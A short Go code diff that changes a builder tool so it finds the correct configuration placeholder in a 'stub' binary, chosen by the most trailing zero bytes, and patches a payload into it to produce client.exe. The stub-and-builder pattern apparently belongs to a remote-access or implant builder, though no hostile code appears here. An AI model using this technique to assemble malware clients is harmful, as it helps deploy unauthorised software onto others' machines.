@@ -54,13 +54,50 @@ func main() {
 		log.Fatalf("[-] Error reading stub: %v", err)
 	}
 
-	index := bytes.Index(data, marker)
-	if index == -1 {
+	// Find all occurrences of the marker
+	var indices []int
+	searchData := data
+	offset := 0
+	for {
+		idx := bytes.Index(searchData, marker)
+		if idx == -1 {
+			break
+		}
+		indices = append(indices, offset+idx)
+		searchData = searchData[idx+1:]
+		offset += idx + 1
+	}
+
+	if len(indices) == 0 {
 		log.Fatalf("[-] Error: Marker not found in stub binary.")
 	}
 
-	if bytes.Count(data, marker) > 1 {
-		log.Fatalf("[-] Error: Multiple markers found in stub binary. Ambiguous patching target.")
+	targetIndex := -1
+	if len(indices) == 1 {
+		targetIndex = indices[0]
+	} else {
+		fmt.Printf("[*] Multiple markers found (%d). Searching for the resource placeholder...\n", len(indices))
+		maxZeros := -1
+		for _, idx := range indices {
+			if idx+len(marker)+2032 > len(data) {
+				continue
+			}
+			// Count zeros in the following 2032 bytes
+			zeros := 0
+			for i := 0; i < 2032; i++ {
+				if data[idx+len(marker)+i] == 0 {
+					zeros++
+				}
+			}
+			if zeros > maxZeros {
+				maxZeros = zeros
+				targetIndex = idx
+			}
+		}
+	}
+
+	if targetIndex == -1 {
+		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
 	}
 
 	config := Config{
@@ -85,7 +122,7 @@ func main() {
 	// Patch data
 	patchedData := make([]byte, len(data))
 	copy(patchedData, data)
-	copy(patchedData[index+len(marker):], finalPayload)
+	copy(patchedData[targetIndex+len(marker):], finalPayload)
 
 	err = ioutil.WriteFile("client.exe", patchedData, 0755)
 	if err != nil {
